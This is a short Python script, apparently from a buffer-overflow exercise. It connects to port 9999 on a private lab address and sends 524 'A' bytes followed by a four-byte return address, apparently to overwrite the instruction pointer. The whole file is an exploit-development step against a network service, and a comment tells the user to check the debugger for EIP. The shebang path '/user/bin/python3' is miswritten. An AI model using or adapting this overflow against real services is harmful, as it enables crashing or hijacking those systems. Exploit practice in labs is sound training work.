#!/user/bin/python3
import socket

host = "10.0.2.4"
defaultPort = 9999
                        #311712F3
shellcode = b"A" * 524 + b"\xF3\x12\x17\x31"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((host, defaultPort))
    s.send(shellcode)
except:
    print("check debugger for EIP")
finally:
    s.close()
